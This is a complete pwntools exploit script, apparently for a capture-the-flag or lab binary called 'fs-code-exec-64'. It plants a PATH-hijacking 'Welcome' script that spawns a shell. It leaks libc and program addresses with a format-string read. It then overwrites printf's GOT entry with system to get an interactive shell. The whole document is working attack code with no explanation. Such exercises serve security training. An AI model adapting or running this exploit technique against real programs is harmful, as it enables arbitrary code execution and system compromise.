from pwn import *
from pathlib import Path

env = {'PATH': '.:/bin:/usr/bin'}

# set up Writing script
welcome = Path('./Welcome')
if not welcome.exists():
    welcome.write_text('#!/bin/sh\nsh')
    welcome.chmod(0o0777)

elf = ELF('./fs-code-exec-64')
libc = elf.libc

#p = process(elf.path, env=env)
p = process(['/usr/local/pin/pin',  '-t', 'obj-intel64/script.so' , '--',  elf.path], env=env)

# Leak libc and text with printf arbitrary read
# leaks the return address of input_func and main
p.sendlineafter(b'Please type your name first:', b'%157$p %165$p')
p.recvuntil(b'Hello ')

main_plus_51 = int(p.recvuntil(b' '), base=16)
elf.address = main_plus_51 - (elf.symbols['main'] + 51)

__libc_start_main_plus_231 = int(p.recvuntil(b'\n'), base=16)
libc.address = __libc_start_main_plus_231 - (libc.symbols['__libc_start_main'] + 231)

# Exploit with arbitrary write
p.sendlineafter(b'How many bytes do you want to write (N, in decimal, max 128 bytes)?', b'8')
p.sendlineafter(b'What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?', hex(elf.got['printf']).encode())
p.sendafter(b'Please provide your input (MAX 8 bytes)', p64(libc.symbols['system']))

p.interactive()
